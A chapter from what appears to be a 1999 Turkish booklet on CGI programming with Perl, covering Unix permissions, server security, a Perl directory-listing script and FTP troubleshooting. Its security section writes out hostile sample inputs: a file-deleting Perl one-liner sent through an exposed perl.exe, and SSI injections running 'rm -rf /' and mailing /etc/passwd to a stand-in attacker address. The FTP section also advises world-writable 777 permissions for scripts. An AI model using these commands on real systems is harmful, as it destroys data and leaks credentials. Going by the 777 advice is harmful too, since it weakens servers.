Piyasada 20’ye yakın Web Server programı var; bunların hemen hepsi, kendilerine evsahipliği yapan işletim sistemi ile Internet ziyaretçisi arasında arabuluculuk yapan bir tür CGI (Common Gateway Interface/Ortak Geçit Arayüzü) vardır. Web Server, site tasarımcısı olarak sizin vereceğiniz sınırlar çerçevesinde Internet ziyaretçisinin çalıştırmak istediği programı çalıştırır ve gerekiyorsa bunun için işletim sisteminden yardım isteyebilir.

CGI’da çalıştırabileceğiniz tek program Perl programı değildir. Yeni Web Server programları, işletim sisteminin sağladığı API (Application Programming Interface/Uygulama Programlama Arayüzü) imkanını kullanarak geliştirilebilecek EXE ve DLL türü programları da çalıştırabilir. Özellikle Windows 95/98/NT/2000 tabanlı WindowsCGI, standart CGI’ın sağladığından fazla imkanlar sağlayabilir. Bununla birlikte, Perl ile herhangi bir CGI için program yazabilirsiniz.

CGI programı yazmak için Perl dışında, C, C++, Tcl veya Tk, PHP, Unix Shellerinden sh, ksh ve csh ile Visual Basic, ASP ve AppleScript dillerini veya tekniklerini kullanabilirsiniz.

Web sitenize evsahipliği yapan firmanın (Hosting şirketi) Web Server’ının ne tür CGI programlarına izin verdiğini öğrenmek ve yazacağınız Perl programlarının bu kurallara uymasını sağlamak, site tasarımcısı ve yönetmeni olarak size düşen bir görevdir. Ücretsiz Web sitesi alanı sağlayan firmalar kimi zaman sadece kendi onaylarından geçmiş Perl programlarına izin verirler. CGI programınızın neler yapabileceğini, neler yapamayacağını, bu kurumun sağladığı yardım dosyalarında bulabilirsiniz. Web sitenize evsahipliği yapacak firma seçerken, ilanlarında “sınırsız CGI desteği” verdiklerini belirtmelerine dikkat etmelisiniz.

Tekerleği yeniden icad etmeyin! Web Server işletmecileri çoğu zaman site hizmeti verdikleri müşterilerine kullanılmaya hazır CGI programları sunarlar. Bu programlar hemen hemen daima, işletmecinin sahip olduğu Web Server programının inceliklerine göre geliştirilmiştir.

Ayrıca Comprehensive Perl Archive Network (CPAN) isimli Perl Arşivi’nde hemen hemen her konuda işinize yarayacak Perl programı bulabilirsiniz. Bu amaçla uğrayacağınız ilk Internet adresi Perl Enstitüsü (www.perl.org) olmalıdır. Perl Home Page (www.perl.com) ve Windows için Perl yorumlayıcısı geliştiren ActiveState (www.ActiveState.com), bu arşive ulaşmak için kestirme yollar arasındadır.

**UNIX Dosya izinleri**

Web Server programı Unix ortamında çılışıyorsa, her dosya ya bir kişiye, ya da bir gruba aittir. Her dosyanın üç set izin durumu vardır: sahibi, grup ve bu ikisine girmeyen idğer herkes için bir dosya (a) okunabilir; (b) yazılabilir, ve (c) çalıştırılabilir olur, veya olmaz.

Bir Unix sisteminde sistem yöneticisi veya root olarak oturum açmış kişi, dosyaların sahiplik durumunu chown komutu ile değiştirebilir. Bir dosyanın sahibi olan kişi veya grubun üyeleri ise dosyanın izin haklarını düzenleyebilir. Unix, bir dosyanın okunabilmesi, yazılabilmesi veya bir dizinde yeni bir dosya veya alt-dizin oluşturulabilmesi için, dosyanın ve dizinin okuma, yazma ve çalıştırma izinlerinin bulunup bulunmadığına bakar.

Bu ilkeler, Unix ortamında çalışan bir Web Server’da, Web alanındaki dosyalara uygulandığında, Perl program dosyalarının çalıştırılabilme izni olması gerektiği anlaşılır. Ayrıca, Perl programlarının okumak ve yazmak için erişmek zorunda olduğu diğer bütün dosyaların da okunabilirlik ve yazılabilirlik izni olması şarttır. Web Sitesine ev sahipliği yapan firma, sizi, size ayırdığı ve Web Server’ına “Web Sitesi” olarak tanıttığı dizinin sahibi yapmıştır. Siz bu yetkinize dayanarak, Web sitenizdeki dosyaların izinlerini değiştirebilir; düzenleyebilirsiniz.

Unix’te dosya izinleri ya komut istemci satırından chmod komutu ile, ya da 8 tabanlı sayı sistemi (octal) ile sayısal olarak verilebilir. Sayılan değer olarak verilen izin sistemi şöyle düzenlenebilir:

Okuma izni 4, yazma izni 2, çalıştırma izni ise 1 olarak gösterilir. Kullanıcı kişinin izinleri 100, grubun izinleri 10 ve diğerleri 1 olarak simgelenir. Bir dosyanın izin değeri, bütün izin değerlerinin toplamı olarak ifade edilir. İzin değeri ise “sahip katsayısı X izin türü katsayısı” olarak bulunur. Örnğin bir dosyasının sahibinin okuma izni olması 100 x 4=400 olarak hesaplanır; bir dosyanın sahibinin yazma izni 200, çalıştırma izni ise 100’dür. Yani dosyanın sahibi dosyayı hem okutabilir,hem yazdırabilir,hem de çalıştırabilirse, dosyanın izin değeri 700 olur. Grubun okutma izni 40 yazdırma izni 20, çalıştırma izni 10 olarak hesaplanabilir; toplamı 70 olu. Bir dosyayı hem sahibi hem de grup, okutabilir, yazrırabilir ve çalıştırabilirse, dosyanın izin değeri 770’e ulaşır. Diğer herkes (veya Unix’teki deyimiyle tüm dünya) tarafından okunabilen, yazılabilir ve çalıştılabilen dosyanın izin değeri 777 olur.

**Server Güvenliği**

Web Server programı, bir bilgisayarın ve onun bağlı olduğu ağın dış dünyaya açılan kapısı ise CGI, dış dünyanın Web Server’a giriş kapısıdır. CGI güvenliği, bütün Web Server’ın güvenliğidir. Eğer kendi Web Server’ınızı çalıştırıyorsanız, program üreticisinin önerdiği güvenlik önlemlerini almanız gerekir. Web Server programı başkası tarafından çalıştırılıyorsa, muhtemelen sizin Perl programlarınızla Server’a zarar vermenizin önüne geçilmiş demektir. Ancak sizin sitenizin (veya teknik ifadesiyle, Server’da size ayrılmış olan alanın güvenliği yine sizden sorulur.

Perl programları, bütün Script dilleri gibi kaynak kodunu kendi içinde barındırır; yani Perl dosyanızın tam metin olarak kötüniyetli bir kişinin eline geçmesi, programın ve dolayısıyla sitenin zaaflarını ortaya çıkartır. Bir örnek verelim.

Ziyaretçilerinizin size güvenerek doldurduğu formlarda elektronik posta adresi gibi, herkesin eline geçmesini istemeyecekleri bilgiler bulunabilir; siz bu bilgileri, (bizim yukarıdaki örneklerde yer alan form\_bilgileri.txt dosyası gibi) bir dosyada topluyor olabilirsiniz. Ben bu dosyanın adını ve durduğu yeri bilirsem, ve bunu Browser’ımın URL adres hanesine yazarsam, sizin Server’ınız tereddüt bile etmeden bu dosyayı bana gönderecektir. Benim bu dosyanın adını bilmem ancak sizin Perl dosyasını tam metin olarak elime geçirmemle mümkün olabilir. Perl dosyanızın adı, Form içeren HTML sayfanızda, FORM etiketinin ACTION hanesinde kayıtlı! Bu ismi Browser’ımın URL hanesine yazarsam, Web Server hata mesajı verir; çünkü Perl programı kendisine bilgi gönderilmeden çalıştırılmış olacağı için hata oluşacaktır. Fakat bir çok kişi, CGI programlarını yeniledikçe, güncelleştirdikçe veya düzelttikçe, eskisini “.bak” uzatmasıyla Server’da tutmayı tercih eder. Bazı programlama editörleri de dosyaların adına “~” işaretini ekleyerek yedeğini çıkartırlar. Bazı programcılar, Perl metinlerinin bir de “.txt” sürümünü saklamayı tercih ederler. Eğer sizin Perl programını edinmeyi kafasına koymuş bir kişi önce bu tür uzatmalardan işe başlayacaktır.

Bir diğer büyük güvenlik ihlali dünyaya perl programınızı çalıştıran Perl yorumlayıcısının (örneğin perl.exe’nin) yerini ilan etmektir. Perl programlarının baş tarafında bunu belirten ifadeler olması, Web için asla zorunlu değildir. Herhangi bir formdan GET yoluyla Perl.exe’ye Perl komutu gönderiyorsanız (örneğin: sizin bir Formunuz’un istediği bilgi giderken kullanıcının Browser’ımın adres hanesinde “http://host.com/cgi-bin/perl.exe?form.pl” gibi bir gönderi belirtisi görülüyorsa) bu kötüniyetli kişilere Browser’larının adres hanesine şu satırı yazma davetiyesidir:

“http://host.com/cgi-bin/perl.exe?-e+unlink+%3C\*.\*%3E%3B”

Bu, bir PC’de “C:\\>del c:\\\*.\*” komutunu vermek ve ondan sonra “Y” tuşuna basmakla aynı sonucu verir!

Perl yorumlayıcısının yerini Internet ziyaretçisini anlamasına imkan vermemek gerekir.

Bir diğer önemli güvenlik ihlali aracı Server Side Include denen ve ”<!--“ ile “ -->” arasında Server’a belirli komutları icra etme, belirli programları çalıştırma imkanı veren düzenlemedir. Giderek daha ç sayıda Server yöneticisi bu imkanı kaldırıyor. Server bu tür Server Side Incvlude (SSI) komutlarını kabul ediyorsa, şu komutan örreğin bir Formun kullanıcı adı veya adresi olarak gelmesi işten bile değildir:

<!--#exec cmd=”/bin/rm –rf /“ -->”

Bu komut da Unix ortamında, DOS’ta “C:\\>del c:\\\*.\*” komutunu vermek ve ondan sonra “Y” tuşuna basmak demektir. Veya SSI taklidi yapan şöyle bir komut:

<!--#exec cmd=”/bin/mail hacker@cracker.com < /etc/passwd“ -->”

Bu komutla bilgisayarınızdaki bütün parolalar, Hacker’a elektronik mesaj olarak gönderilecektir. Bu kitaptaki örneklerimizde bir Form’dan aldığımız bilgileri “$deger =~s/<!--(.|\\n)\*-->//g;” deyimi ile bu tür komutlardan temizlediğimizi görmüş olmalısınız. Fakat bu kitapçık Web Server güvenliğinin nasıl sağlanacağına değinebilmek için çok küçük; ve çoğu zaman Web Server güvenliğini sağlamak CGI programcısının değil, Server yönetmeninin görevidir. CGI programcısı olarak bize düşen, en azından Form bilgilerini işlemeye başlarken, bir alanda olması gerekmeyen karakterler varsa, onları temizlemektir. Örneğin bir Form’un isim ve elektronik adres hanelerinde”ters bölü işaretinin bulunması gerekmez! Bu alanlarda bu tür işaretler varsa, temizlenmesi yerinde olur.

**Server’da program çalıştırmak**

HTTP Server’da çalıştıracağımız başalıca programın elektronik mesaj gönderme programı olduğuna yukarıda değindik. Bunun dışında en sık kullanmak isteyebileceğiniz komutlardan biri örneğin DOS’un “c:\\> dir” veya Unix’in “ls” komutuna benzeyen “readdir()” fonksiyonudur. Perl, bu fonksiyonu içinde bulunduğu CGI ortamına ve işletim sistemine uygun tarzda çalıştırır. Bu kodun kullanımına bir örnek verebiliriz:

print "Content-type: text/html\\n\\n";

print "<meta http-equiv=\\"content-type\\" content=\\"text/html; charset=ISO-8859-9\\">\\n";

print "<meta http-equiv=\\"Content-Type\\" content=\\"text/html; charset=windows-1254\\">\\n";

print "<H3><CENTER>Dizindeki dosyalar</CENTER></H3>\\n";

opendir (DIZIN, ".");

while($dosya\_adi = readdir(DIZIN)) {

if ($dosya\_adi =~ /^\\w\*.htm/){

push(@dosyalar, $dosya\_adi);

print "<A HREF=\\"$dosya\_adi\\"> $dosya\_adi </A>\\n";

print "<BR>\\n";

}

}

closedir(DIZIN);

Burada opendir() fonksiyonunun programın bulunduğu dizinde yani kısaltması nokta (.) işareti olan dizini içeriği okunmak üzere ve DIZIN tutamağı (Handle) ile açtığına dikkat edin. Buradaki tutamak da tıpkı okunmak-yazılmak üzere açılan bir dosya tutamağı gibi tamamen keyfî bir kelimedir. Program daha sonra dizindeki dosya adlarını okuyarak uzatması “.htm” olanları @dosyalar dizisinde topluyor ve bu listeyi ziyaretçinin ekranında görüntülüyor. (Bu programı örneğin “dir.pl” adıyla da kaydedebilir ve dizinlerin içindeki dosyaları ziyeretçilerinize listelemeniz gerektiği yerde bir köprü ile kullanabilirsiniz.)

**Server ile FTP İlişkisi**

Özene bezene yazdığınız ve kendi kişisel Web Server’ınızda başarıyla sınadığınız bir CGI programının Web sitesinde çalışmaması kadar üzücü bir şey olamaz. Bunun bir çok sebebi olabilir; fakat bu sebeplerin başında Web Server işletmecisinin CGI programlarına izin vermemesi gelir. Diğer sebepleri araştırmaya başlamadan önce Web sitenize evsahipliği yapan firmanın CGI programlarına izin verdiğinden imen olmalısınız.

CGI programlarına izin veren bir sitede Perl programlarının işlememesinin birinci sebebi dosya ve dizin izinlerinin doğru ayarlanmamış olmasıdır. Sitenize evsahipliği yapan firmanın Web Server’ı Unix-tabanlı ise ve bir FTP programının yardımı ile dizin ve dosyalarınızın izinlerini dosyaları okumanıza, yşazmasına ve çalıştırmanıza imkan verecek şekilde değiştirebilirsiniz. Internet ziyaretçileriniz Unix açısından dosya sahibi kişi ve grubunda dışında kalan herkes sayılır; dolayısıyla Perl programlarınızın tüm dünya için okuma-yazma-çalıştırma izni bulunması, yani Octal sayı olarak dosya izin değerinin 777 olması gerekir.

Perl programlarınızın işlememesinin bir diğer sebebi, bilgisayarınızdan Server’a FTP programı ile gönderilirken ASCII dosyası transfer yöntemi yerine binary dosya transfer yöntemi kullanılması olmasıdır.

Piyasada yaygın kullanılan CuteFTP ve WS\_FTP programları genellikle transfer etmek istediğiniz dosyanın düz yazı dosyası mı, yoksa grafik-ses-multimedya veya program dosyası mı olduğunu anlayıp, uygun transfer yöntemini kullanabilirler. Perl programları düz yazı dosyaları olduğu için FTp programları bunları ASCII transfer yöntemiyle gönderirler. Ancak siz kullanıcı olarak FTP programını yanlışlıkla sadece binary yöntemini kullanmaya zorlamış olabilirsiniz. Kontrol etmeniz gereken ikinci nokta, FTP programınızın hangi yöntemle transfer yaptığı olmalıdır.

Bazı Web Server programları, güvenlik kaygısıyla sadece cgi-bin dizinindeki Perl programlarını çalıştırmak üzere ayarlanabilir. Sitenizin evsahibininin böyle bir zorunluk getirip getirmediğini araştırmalısınız; ve böyle bir zorunluk varsa, bütün Perl programlarınızı cgi-bin dizinine koymalısınız.

W/O:

**PAGE 1**

CGI / Perl ** PAGE 1******

---
*Kaynak: `CGI-PERL KULLANIMI/ekitap-Hakki_Ícal-Kitapcik_CGI_Perl.doc` — Hakki Ocal — 1999*
*Örnekler: `CGI-Perl-Kullanimi/ornekler/` (30 dosya)*
*Görseller: `CGI-Perl-Kullanimi/gorseller/` (1 dosya)*
